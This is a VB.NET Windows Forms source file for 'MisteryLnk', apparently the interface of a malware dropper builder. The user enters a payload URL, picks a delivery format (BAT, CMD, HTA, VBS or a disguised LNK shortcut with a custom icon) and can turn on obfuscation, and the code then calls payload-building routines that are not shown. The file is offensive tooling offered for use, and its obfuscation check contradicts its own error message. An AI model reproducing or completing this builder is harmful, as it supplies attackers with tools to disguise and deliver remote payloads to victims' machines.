Imports MisteryLnk.Algorithms
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Diagnostics
Imports System.Drawing
Imports System.Linq
Imports System.Security.Principal
Imports System.Text
Imports System.Threading.Tasks
Imports System.Windows.Forms

Namespace MisteryLnk
	Partial Public Class Form1
		Inherits Form

		Private Shared IconFile As String
		Public Sub New()
			InitializeComponent()
		End Sub
		#Region "FormMethods"
		Private Sub Form1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseDown
			Me.Capture = False
			Dim msg = Message.Create(Me.Handle, &Ha1, New IntPtr(2), IntPtr.Zero)
			Me.WndProc(msg)
		End Sub

		Private Sub CloseBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CloseBtn.Click
			Application.Exit()
		End Sub

		Private Sub MinimazeBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MinimazeBtn.Click
			WindowState = FormWindowState.Minimized
		End Sub
		#End Region

		#Region "Main Functions"
		Private Sub BuildBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BuildBtn.Click
			Dim MethodsMassive() As String = { "BAT", "CMD", "HTA", "LNK", "VBS" }

			Dim url As String = UrlPayload_Box.Text, DropMethod As String = MethodDrop_Menu.Text

			Dim obfuscate As Boolean = ObfuscateChk.Checked

			If String.IsNullOrEmpty(url) OrElse String.IsNullOrEmpty(DropMethod) Then
				MessageBox.Show("Forms cannot be empty!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Information)
				Return
			End If

			If MethodsMassive.Contains(DropMethod) Then
				If obfuscate AndAlso Not(DropMethod = "BAT" OrElse DropMethod = "CMD" OrElse DropMethod = "VBS") Then
					MessageBox.Show("Obfuscation is only available for CMD, BAT, VBS and HTA methods!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error)
					Return
				End If

				Select Case DropMethod
					Case "BAT"
						Builder.BatBuilder(url, DropMethod, obfuscate)
					Case "CMD"
						Builder.CmdBuilder(url, DropMethod, obfuscate)
					Case "HTA"
						Builder.HtaBuilder(url, DropMethod)
					Case "VBS"
						Builder.VbsBuilder(url, DropMethod, obfuscate)
					Case "LNK"
						Builder.LnkBuilder(url, DropMethod, IconFile)
					Case Else
						MessageBox.Show("Invalid method selected!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error)
				End Select
			Else
				MessageBox.Show("Selected method is not supported!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End If
		End Sub

		Private Sub IconSelectBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles IconSelectBtn.Click
			Using openIcon As New OpenFileDialog()
				openIcon.Title = "Select ICON file."
				openIcon.Filter = "ICO (*.ico)|*.ico"

				If openIcon.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
					LnkIcon.Image = Image.FromFile(openIcon.FileName)
					IconFile = openIcon.FileName
				End If
			End Using
		End Sub

		Private Sub LogotypeProgram_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LogotypeProgram.Click
			Process.Start("https://github.com/k3rnel-dev")
		End Sub
		#End Region
	End Class
End Namespace
